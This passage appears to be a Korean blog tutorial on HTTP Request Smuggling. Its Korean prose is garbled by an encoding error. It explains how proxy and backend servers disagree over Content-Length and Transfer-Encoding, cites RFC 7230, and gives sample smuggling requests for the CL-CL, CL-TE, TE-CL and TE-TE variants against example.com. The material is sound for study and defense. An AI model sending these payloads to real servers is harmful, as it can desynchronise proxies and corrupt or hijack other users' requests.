&lt;p&gt;í•˜ì§€ë§Œ ì—¬ê¸°ì„œ ê·¸ì¹˜ì§€ ì•Šê³  í•œë‹¨ê³„ ë” ë‚˜ì•„ê°€ HTTP pipelining ì´ë¼ëŠ” ê¸°ìˆ ì„ êµ¬í˜„í•©ë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ HTTP ìš”ì²­ì€ ìˆœì°¨ì ìœ¼ë¡œ ì§„í–‰ë©ë‹ˆë‹¤. ì²«ë²ˆì§¸ ìš”ì²­ì— ëŒ€í•œ ì‘ë‹µì„ ë°›ê³  ë‘ë²ˆì§¸ ìš”ì²­ì„ ë³´ë‚´ëŠ” ë°©ì‹ìœ¼ë¡œ ì‘ë™í•©ë‹ˆë‹¤. ì´ëŠ” ë„¤íŠ¸ì›Œí¬ ì§€ì—°ì˜ ì˜í–¥ì„ ë§ì´ ë°›ìŠµë‹ˆë‹¤. HTTP pipeliningì€ ë„¤íŠ¸ì›Œí¬ ì§€ì—°ì„ í”¼í•˜ê¸° ìœ„í•´ ì‘ë‹µì„ ê¸°ë‹¤ë¦¬ì§€ ì•Šê³  ì—°ì†ì ì¸ ìš”ì²­ì„ ì „ì†¡í•˜ì—¬ ë„¤íŠ¸ì›Œí¬ ì§€ì—°ì„ ìµœëŒ€í•œ ì¤„ì´ë„ë¡ êµ¬í˜„ë˜ì–´ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;3-3-í•˜ì§€ë§Œ-í”„ë¡ì‹œì—ì„œëŠ”&quot;&gt;3-3. í•˜ì§€ë§Œ, í”„ë¡ì‹œì—ì„œëŠ”?&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/a17927c9-5a66-49a3-85c6-6876c9bae067/9e9f6c7e-9c11-4f86-a409-9314e7f9cca9.png&quot; alt=&quot;/assets/a17927c9-5a66-49a3-85c6-6876c9bae067/9e9f6c7e-9c11-4f86-a409-9314e7f9cca9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;í”„ë¡ì‹œì—ì„œëŠ” ë°±ì—”ë“œ ì„œë²„ì™€ HTTP pipeliningì„ ì‚¬ìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë°±ì—”ë“œ ì„œë²„ì—ì„œëŠ” HTTP pipeliningì„ ì§€ì›í•˜ì§€ë§Œ ì´ë¥¼ í”„ë¡ì‹œì™€ ë°±ì—”ë“œ ì„œë²„ê°„ í†µì‹ ì‹œ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê²ƒì„ ì¸ì‹í•˜ì§€ ëª»í•©ë‹ˆë‹¤. ì—¬ê¸°ì—ì„œë¶€í„° ë¬¸ì œê°€ ë°œìƒí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;3-4-ì·¨ì•½ì -ë°œìƒ&quot;&gt;3-4. ì·¨ì•½ì  ë°œìƒ&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/9d793785-00bf-4bcd-ac2a-6ae03907b8d2/672ba11d-2c34-40cb-8f52-ee87cf060433.png&quot; alt=&quot;/assets/9d793785-00bf-4bcd-ac2a-6ae03907b8d2/672ba11d-2c34-40cb-8f52-ee87cf060433.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì •ìƒì ì¸ ê²½ìš°ì—ëŠ” ìœ„ ê·¸ë¦¼ê³¼ ê°™ì´ ìˆœì°¨ì ìœ¼ë¡œ ë“¤ì–´ì˜¨ ìš”ì²­ì„ í”„ë¡ì‹œì™€ ë°±ì—”ë“œ ì„œë²„ì—ì„œ ì²˜ë¦¬í•˜ë¯€ë¡œ ì•„ë¬´ëŸ° ë¬¸ì œê°€ ë°œìƒí•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/18656436-bb67-424d-bf77-ab1104016ec3/281b6434-9f56-4b8f-93c4-6d1431f7a797.png&quot; alt=&quot;/assets/18656436-bb67-424d-bf77-ab1104016ec3/281b6434-9f56-4b8f-93c4-6d1431f7a797.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë§Œì•½ ì–´ë–¤ ë°©ë²•ì„ í†µí•´ì„œ ë‘ ê°œì˜ ìš”ì²­ì„ í•˜ë‚˜ì˜ ìš”ì²­ìœ¼ë¡œ ì¸ì‹í•˜ê²Œ í•˜ì—¬ ì „ì†¡í•˜ë©´ ì–´ë–»ê²Œ ë ê¹Œìš”? í”„ë¡ì‹œì—ì„œ ë‘ ê°œì˜ ìš”ì²­ì„ í•˜ë‚˜ì˜ ìš”ì²­ìœ¼ë¡œ ì¸ì‹í•˜ì—¬ ì„œë²„ì— ì „ì†¡í•˜ê²Œ ë©ë‹ˆë‹¤. ë‘ ê°œì˜ ìš”ì²­ì„ ë°›ê²Œ ëœ ì„œë²„ëŠ” ìµœì´ˆì˜ ìš”ì²­ì— ëŒ€í•œ ì‘ë‹µì„ í”„ë¡ì‹œë¡œ ì „ì†¡í•˜ê²Œ ë˜ê³  ë‘ ë²ˆì§¸ ìš”ì²­ì€ ì²˜ë¦¬ë˜ì§€ ì•Šê³  ë‚¨ì•„ìˆê²Œ ë©ë‹ˆë‹¤. ì´ëŠ” ì´í›„ì— ì „ì†¡ëœ ìš”ì²­ê³¼ í•¨ê»˜ ì²˜ë¦¬ë˜ì–´ ì‘ë‹µì„ ì „ì†¡í•˜ê²Œ ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ í”„ë¡ì‹œì™€ ë°±ì—”ë“œ ì„œë²„ì˜ HTTP Request íŒ¨í‚·ì„ ì²˜ë¦¬í•˜ëŠ” ë°©ì‹ì˜ ì°¨ì´ë¡œ ì¸í•´ HTTP Request Smuggling ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;3-5-ë‘-ê°œì˜-ìš”ì²­ì„-í•˜ë‚˜ë¡œ-ë³´ë‚´ê¸°&quot;&gt;3-5. ë‘ ê°œì˜ ìš”ì²­ì„ í•˜ë‚˜ë¡œ ë³´ë‚´ê¸°&lt;/h3&gt;

&lt;p&gt;ê·¸ë ‡ë‹¤ë©´ ë‘ ê°œì˜ ìš”ì²­ì„ í•˜ë‚˜ë¡œ ì¸ì‹í•˜ë„ë¡ ë³´ë‚´ëŠ” ë°©ë²•ì—ëŠ” ì–´ë–¤ ë°©ë²•ì´ ìˆì„ê¹Œìš”? í”„ë¡ì‹œì™€ ì„œë²„ê°€ ì–´ë–¤ ë°©ì‹ìœ¼ë¡œ íŒ¨í‚·ì„ ì²˜ë¦¬í•˜ëŠëƒì— ë”°ë¼ ë‹¤ë¦…ë‹ˆë‹¤. ë¨¼ì € ë‘ ê°œì˜ ìš”ì²­ì„ í•˜ë‚˜ë¡œ ì¸ì‹í•˜ê²Œ í•˜ê¸° ìœ„í•´ íŒ¨í‚·ì„ ì•½ê°„ ê¼¬ì•„ì•¼ í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ê¸°ë³¸ì ìœ¼ë¡œ HTTPì—ì„œ ë°ì´í„°ë¥¼ í¬í•¨í•˜ì—¬ íŒ¨í‚·ì„ ì „ì†¡í•˜ëŠ” ë°©ì‹ì— ëŒ€í•´ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤. HTTPì—ì„œ HTTP Bodyë¥¼ ì „ì†¡í•˜ê¸° ìœ„í•´ ë¨¼ì € ì „ì†¡í•˜ëŠ” ë°ì´í„°ì˜ í¬ê¸°ë¥¼ ë³´ë‚´ì¤˜ì•¼ í•©ë‹ˆë‹¤. ê·¸ë˜ì•¼ íŒ¨í‚·ì„ ìˆ˜ì‹ ë°›ëŠ” ìª½ì—ì„œëŠ” ë°ì´í„°ë¥¼ ì–¼ë§ˆë‚˜ ë°›ì•„ì•¼ í•  ì§€ ì¤€ë¹„ë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê³¼ì •ì—ì„œ ì‚¬ìš©í•˜ëŠ” ë°©ë²•ì´ ë‘ ê°€ì§€ê°€ ìˆëŠ”ë°, Content-Lengthì™€ Transfer-Encooding ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;Content-LengthëŠ” HTTP Bodyì˜ ê¸¸ì´ë¥¼ HTTP Headerì— í¬í•¨í•˜ì—¬ ì „ì†¡í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì „ì†¡í•˜ëŠ” ë°ì´í„°ì˜ í¬ê¸°ë¥¼ ë¯¸ë¦¬ ì•Œê³  ìˆëŠ” ê²½ìš°ì™€ ë‹¤ëŸ‰ì˜ íŒ¨í‚· ì²˜ë¦¬ì— ì í•©í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

data=a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Transfer-Encoodingì€ í”„ë¡œì„¸ìŠ¤ê°€ ì™„ì „íˆ ì²˜ë¦¬ë˜ê¸° ì „ê¹Œì§€ ì „ì†¡ë˜ëŠ” ë°ì´í„°ì˜ ì „ì²´ í¬ê¸°ë¥¼ íŒŒì•…í•˜ì§€ ëª»í•˜ëŠ” ê²½ìš° ìœ ìš©í•©ë‹ˆë‹¤. ë°ì´í„°ë¥¼ ë³´ë‚´ê¸° ì „ ì•ì— ë°ì´í„°ì˜ í¬ê¸°ë¥¼ 16ì§„ìˆ˜ë¡œ ì „ì†¡í•˜ê³  ë°ì´í„°ë¥¼ ì „ì†¡í•©ë‹ˆë‹¤. ë” ì´ìƒ ë°ì´í„°ë¥¼ ë³´ë‚´ì§€ ì•Šê³  ì¢…ë£Œí•˜ëŠ” ê²½ìš° 0\r\n\r\nìœ¼ë¡œ ì¢…ë£Œí•©ë‹ˆë‹¤. Transfer-Encoodingì€ ì²˜ë¦¬ë˜ëŠ” ì‘ë‹µ ê²°ê³¼ê°€ í° ê²½ìš°ë‚˜, ìŠ¤íŠ¸ë¦¬ë° ë“±ì— ì£¼ë¡œ ì‚¬ìš©í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

6\r\n
data=a\r\n
0\r\n\r\n
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê·¸ë ‡ë‹¤ë©´, ì´ ë‘ ê°€ì§€ë¥¼ ëª¨ë‘ í¬í•¨í•˜ì—¬ ì „ì†¡í•˜ê²Œ ë˜ë©´ ì„œë²„ëŠ” ì–´ë–¤ ê²ƒì„ ë¨¼ì € ì²˜ë¦¬í•˜ê³  ì–´ë–»ê²Œ ë°˜ì‘í•´ì•¼ í• ê¹Œìš”?&lt;/p&gt;

&lt;p&gt;rfc7230 ë¬¸ì„œì˜ #section-3.3.3 3í•­ì— ë”°ë¥´ë©´ Transfer-Encoding ë° Content-Length í—¤ë”ê°€ í•¨ê»˜ ìˆ˜ì‹ ë˜ë©´ Transfer-Encodingì´ Content-Lengthë¥¼ ëŒ€ì²´í•´ì•¼ í•œë‹¤ê³  ë‚˜ì™€ìˆìŠµë‹ˆë‹¤. ë˜í•œ Transfer-Encoding í—¤ë”ê°€ ìš”ì²­ì— ì¡´ì¬í•˜ê³  ì²­í¬ëœ ì „ì†¡ ì¸ì½”ë”©ì´ ìµœì¢… ì¸ì½”ë”©ì´ ì•„ë‹Œ ê²½ìš°, ì „ì†¡ëœ ë°ì´í„°ì˜ ê¸¸ì´ëŠ” ì‹ ë¢°ì„± ìˆê²Œ ê²°ì •ë  ìˆ˜ ì—†ìœ¼ë©° ì„œë²„ëŠ” ë°˜ë“œì‹œ 400 (Bad Request) ìƒíƒœ ì½”ë“œë¡œ ì‘ë‹µ í•œ ë‹¤ìŒ ì—°ê²°ì„ ë‹«ì•„ì•¼í•œë‹¤ê³  ë‚˜ì™€ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;If a Transfer-Encoding header field is present in a response and the chunked transfer coding is not the final encoding, the message body length is determined by reading the connection until it is closed by the server. If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection.
If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.
&lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.3&quot;&gt;https://tools.ietf.org/html/rfc7230#section-3.3.3&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;í•˜ì§€ë§Œ, í”„ë¡ì‹œê°€ ìœ„ì˜ ë¬¸ì„œë¥¼ ë”°ë¥´ì§€ ì•Šê³  êµ¬í˜„ë˜ì–´ ìˆì„ ê²½ìš° HTTP Request Smuggling ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤. ê³µê²©ìëŠ” Content-Lengthì™€ Transfer-Encoodingë¥¼ ì ì ˆíˆ í™œìš©í•˜ì—¬ ë‘ ê°œì˜ ìš”ì²­ì„ í•˜ë‚˜ë¡œ ë³´ë‚´ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n
\r\n
G
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë§Œì•½ í”„ë¡ì‹œê°€ ì´ì™€ ê°™ì€ HTTP ìš”ì²­ì„ ìˆ˜ì‹ í•˜ì˜€ë‹¤ê³  ê°€ì •í•˜ê³  ì§„í–‰í•˜ê² ìŠµë‹ˆë‹¤. í”„ë¡ì‹œëŠ” Content-Lengthì™€ Transfer-Encoodingì´ ìˆì„ ê²½ìš° Content-Lengthë¥¼ ìš°ì„ ì ìœ¼ë¡œ ì²˜ë¦¬í•œë‹¤ê³  ê°€ì •í•©ë‹ˆë‹¤. ì´ ê²½ìš° í”„ë¡ì‹œëŠ” ì „ì†¡ëœ HTTP ìš”ì²­ì„ í•˜ë‚˜ì˜ ìš”ì²­ìœ¼ë¡œ ì¸ì‹í•˜ê³  ë°±ì—”ë“œ ì„œë²„ë¡œ ì „ì†¡í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/a16fb85a-611e-4957-af4b-b20b7a714d9d/3b3678e2-a0f0-458b-b898-4ba9173b1bdb.png&quot; alt=&quot;/assets/a16fb85a-611e-4957-af4b-b20b7a714d9d/3b3678e2-a0f0-458b-b898-4ba9173b1bdb.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë°±ì—”ë“œ ì„œë²„ëŠ” Content-Lengthì™€ Transfer-Encoodingì´ ìˆì„ ê²½ìš° Transfer-Encoodingì„ ìš°ì„ ì ìœ¼ë¡œ ì²˜ë¦¬í•œë‹¤ê³  ê°€ì •í•©ë‹ˆë‹¤. Transfer-Encoodingì„ ìš°ì„  ì²˜ë¦¬í•˜ì—¬ Transfer-Encooding ì¢…ë£Œ ë¬¸ìì¸ 0\r\n\r\nê¹Œì§€ í•˜ë‚˜ì˜ íŒ¨í‚·ìœ¼ë¡œ ì¸ì‹í•©ë‹ˆë‹¤. ë‚˜ë¨¸ì§€ ë‚¨ì€ GëŠ” ì²˜ë¦¬í•˜ì§€ ì•Šê³  ë²„í¼ì— ë‚¨ì•„ìˆëŠ” ì±„ë¡œ 0\r\n\r\nê¹Œì§€ì˜ ìš”ì²­ì— ëŒ€í•œ ì‘ë‹µì„ ì „ì†¡í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET / HTTP/1.1
Host: example.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê·¸ ë•Œ, ìƒˆë¡œìš´ ì‚¬ìš©ìê°€ ìƒˆë¡œìš´ HTTP ìš”ì²­ì„ ì§„í–‰í•©ë‹ˆë‹¤. í”„ë¡ì‹œëŠ” í•´ë‹¹ ìš”ì²­ì„ ë°±ì—”ë“œ ì„œë²„ì— ì „ì†¡í•˜ê³ , ë°±ì—”ë“œ ì„œë²„ëŠ” í•´ë‹¹ ìš”ì²­ì„ ë°›ìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ, ì—¬ê¸°ì—ì„œ ì´ì „ ìš”ì²­ì— ì²˜ë¦¬ë˜ì§€ ì•Šê³  ë‚¨ì•„ìˆë˜ ë°ì´í„°ê°€ ê°™ì´ í¬í•¨ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ì•„ë˜ì™€ ê°™ì´ Gê°€ HTTP ìš”ì²­ íŒ¨í‚· ì• ë¶€ë¶„ì— ë¶™ì–´ ì²˜ë¦¬ë˜ë¯€ë¡œ í•´ë‹¹ íŒ¨í‚·ì€ ì •ìƒì ìœ¼ë¡œ ì²˜ë¦¬ë˜ì§€ ì•Šê³  405 (Method Not Allowed) ì—ëŸ¬ë¥¼ ë°˜í™˜í•˜ê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/df81e1f2-fb3b-4ef2-9171-bf1eb96ca42c/aca0f9b6-e029-403a-b8ed-3eb2a021b349.png&quot; alt=&quot;/assets/df81e1f2-fb3b-4ef2-9171-bf1eb96ca42c/aca0f9b6-e029-403a-b8ed-3eb2a021b349.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;**G**GET / HTTP/1.1
Host: example.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;í”„ë¡ì‹œì™€ ë°±ì—”ë“œ ì„œë²„ê°€ ì–´ë–¤ í—¤ë”ë¥¼ ìš°ì„ ì ìœ¼ë¡œ ì¸ì‹í•˜ëŠ”ì§€ì— ë”°ë¼ ê³µê²© ê¸°ë²•ì´ ì¡°ê¸ˆì”© ë‹¬ë¼ì§€ê¸° ë•Œë¬¸ì— ì´ë¥¼ ì´í•´í•˜ê¸° ì‰½ê²Œ CL-TEì™€ ê°™ì´ ì•½ì‹ìœ¼ë¡œ í‘œí˜„í•©ë‹ˆë‹¤. ìœ„ ì˜ˆì‹œì™€ ê°™ì´ í”„ë¡ì‹œëŠ” Content-Lengthë¥¼ ìš°ì„ ì ìœ¼ë¡œ ì²˜ë¦¬í•˜ê³  ë°±ì—”ë“œ ì„œë²„ëŠ” Transfer-Encoodingì„ ìš°ì„ ì ìœ¼ë¡œ ì²˜ë¦¬í•  ê²½ìš° CL-TEë¼ê³  í‘œí˜„í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;3-6-cl-cl&quot;&gt;3-6. CL-CL&lt;/h3&gt;

&lt;p&gt;rfc7230 ë¬¸ì„œì˜ #section-3.3.3 4í•­ì— ë”°ë¥´ë©´ ì—¬ëŸ¬ Content-Length í—¤ë”ê°€ ì¡´ì¬í•˜ê±°ë‚˜ ìœ íš¨í•˜ì§€ ì•Šì€ ê°’ì¼ ê²½ìš°, 400 (Bad Request) ìƒíƒœ ì½”ë“œë¡œ ì‘ë‹µ í•œ ë‹¤ìŒ ì—°ê²°ì„ ë‹«ì•„ì•¼í•œë‹¤ê³  ë‚˜ì™€ìˆìŠµë‹ˆë‹¤. ì´ì™€ ê°™ì´ êµ¬í˜„í•˜ì§€ ì•Šì„ ê²½ìš° HTTP Request Smuggling ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;If a message is received without Transfer-Encoding and witheither multiple Content-Length header fields having differingfield-values or a single Content-Length header field having aninvalid value, then the message framing is invalid and there cipient MUST treat it as an unrecoverable error. If this is arequest message, the server MUST respond with a 400 (Bad Request)status code and then close the connection. If this is a responsemessage received by a proxy, the proxy MUST close the connectionto the server, discard the received response, and send a 502 (Bad Gateway) response to the client.
&lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.3&quot;&gt;https://tools.ietf.org/html/rfc7230#section-3.3.3&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST / HTTP/1.1
Host: example.com
Content-Length: 8
Content-Length: 7

12345\r\n
a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;CL-CLì€ í”„ë¡ì‹œ ì„œë²„ì—ì„œ ì¸ì‹í•œ ë°ì´í„° ê¸¸ì´ëŠ” 8ì´ê³ , ê·¸ í›„ ë°±ì—”ë“œ ì„œë²„ë¡œ ì „ì†¡ë©ë‹ˆë‹¤. ë°±ì—”ë“œ ì„œë²„ì—ì„œëŠ” ë°ì´í„° ê¸¸ì´ë¥¼ 7ë¡œ ì¸ì‹í•˜ê³  í•´ë‹¹ ìš”ì²­ì— ëŒ€í•œ ì‘ë‹µì„ ì²˜ë¦¬í•©ë‹ˆë‹¤. ì´í›„ ë‚¨ì€ aëŠ” ë²„í¼ì— ë‚¨ì•„ ë‹¤ìŒ ìš”ì²­ê³¼ í•¨ê»˜ ì²˜ë¦¬ë˜ë¯€ë¡œ HTTP Request Smuggling ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;3-7-cl-te&quot;&gt;3-7. CL-TE&lt;/h3&gt;

&lt;p&gt;rfc7230 ë¬¸ì„œì˜ #section-3.3.3 3í•­ì— ë”°ë¥´ë©´ Transfer-Encoding ë° Content-Length í—¤ë”ê°€ í•¨ê»˜ ìˆ˜ì‹ ë˜ë©´ Transfer-Encodingì´ Content-Lengthë¥¼ ëŒ€ì²´í•´ì•¼ í•œë‹¤ê³  ë‚˜ì™€ìˆìŠµë‹ˆë‹¤. ë˜í•œ Transfer-Encoding í—¤ë”ê°€ ìš”ì²­ì— ì¡´ì¬í•˜ê³  ì²­í¬ëœ ì „ì†¡ ì¸ì½”ë”©ì´ ìµœì¢… ì¸ì½”ë”©ì´ ì•„ë‹Œ ê²½ìš°, ì „ì†¡ëœ ë°ì´í„°ì˜ ê¸¸ì´ëŠ” ì‹ ë¢°ì„± ìˆê²Œ ê²°ì •ë  ìˆ˜ ì—†ìœ¼ë©° ì„œë²„ëŠ” ë°˜ë“œì‹œ 400 (Bad Request) ìƒíƒœ ì½”ë“œë¡œ ì‘ë‹µ í•œ ë‹¤ìŒ ì—°ê²°ì„ ë‹«ì•„ì•¼í•œë‹¤ê³  ë‚˜ì™€ìˆìŠµë‹ˆë‹¤. ì´ì™€ ê°™ì´ êµ¬í˜„í•˜ì§€ ì•Šì„ ê²½ìš° HTTP Request Smuggling ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;If a Transfer-Encoding header field is present in a response and the chunked transfer coding is not the final encoding, the message body length is determined by reading the connection until it is closed by the server. If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection.
If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.
&lt;a href=&quot;https://tools.ietf.org/html/rfc7230#section-3.3.3&quot;&gt;https://tools.ietf.org/html/rfc7230#section-3.3.3&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n
\r\n
G
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;CL-TEëŠ” í”„ë¡ì‹œ ì„œë²„ì—ì„œ Content-Lengthë¥¼ ë¨¼ì € ì¸ì‹í•˜ê³  ì²˜ë¦¬í•˜ë¯€ë¡œ ìœ„ì™€ ê°™ì€ íŒ¨í‚·ì´ ì „ì†¡ë˜ë©´ ì „ì²´ë¥¼ ë°±ì—”ë“œ ì„œë²„ë¡œ ì „ì†¡í•©ë‹ˆë‹¤. ë°±ì—”ë“œ ì„œë²„ì—ì„œëŠ” Transfer-Encoodingì„ ìš°ì„ ì ìœ¼ë¡œ ì²˜ë¦¬í•˜ë¯€ë¡œ Transfer-Encooding chunked ë°ì´í„° ì¢…ë£Œ í‘œì‹œì¸ 0\r\n\r\nê¹Œì§€ ìš”ì²­ì„ ì²˜ë¦¬í•˜ê³  ì‘ë‹µì„ ë°˜í™˜í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ë’¤ì— ë‚¨ì•„ìˆëŠ” GëŠ” ë²„í¼ì— ë‚¨ì•„ ë‹¤ìŒ ìš”ì²­ê³¼ í•¨ê»˜ ì²˜ë¦¬ë˜ë¯€ë¡œ HTTP Request Smuggling ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;3-8-te-cl&quot;&gt;3-8. TE-CL&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

12\r\n
GPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;TE-CLì€ í”„ë¡ì‹œ ì„œë²„ì—ì„œ Transfer-Encoodingì„ ë¨¼ì € ì²˜ë¦¬í•˜ë¯€ë¡œ Transfer-Encooding chunked ë°ì´í„° ì¢…ë£Œ í‘œì‹œì¸ 0\r\n\r\nê¹Œì§€ ìš”ì²­ì„ ë°±ì—”ë“œ ì„œë²„ë¡œ ì „ì†¡í•©ë‹ˆë‹¤. ë°±ì—”ë“œ ì„œë²„ì—ì„œëŠ” Content-Lengthë¥¼ ë¨¼ì € ì¸ì‹í•˜ê³  ì²˜ë¦¬í•˜ë¯€ë¡œ Content-Lengthë¡œ ì „ì†¡ëœ 4ë°”ì´íŠ¸ ë¬¸ìì—´ì¸ 12\r\nê¹Œì§€ ìš”ì²­ì„ ì²˜ë¦¬í•˜ê³  ì‘ë‹µì„ ë°˜í™˜í•©ë‹ˆë‹¤. ë”°ë¼ì„œ GPOSTë¶€í„°ì˜ ë¬¸ìì—´ì€ ë²„í¼ì— ë‚¨ì•„ ë‹¤ìŒ ìš”ì²­ê³¼ í•¨ê»˜ ì²˜ë¦¬ë˜ë¯€ë¡œ HTTP Request Smuggling ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;3-9-te-te&quot;&gt;3-9. TE-TE&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;TE-TEëŠ” Transfer-Encoding í—¤ë”ì— ê°œí–‰ë¬¸ì ë˜ëŠ” ì˜ëª»ëœ ì¸ì½”ë”© í˜•ì‹ ì§€ì • ë“±ì„ ì´ìš©í•˜ì—¬ í”„ë¡ì‹œë‚˜ ë°±ì—”ë“œ ì„œë²„ ë‘˜ ì¤‘ í•˜ë‚˜ëŠ” Transfer-Encodingì„ ì‚¬ìš©í•˜ì§€ ì•Šë„ë¡ í•˜ì—¬ ê³µê²©í•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤. ì–´ë–¤ ì˜ë¯¸ì—ì„œëŠ” CL-TE, TE-CLê³¼ í¬ê²Œ ë‹¤ë¥´ì§€ ì•Šìœ¼ë¯€ë¡œ CL-TE, TE-CL ì´ë¼ê³  í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

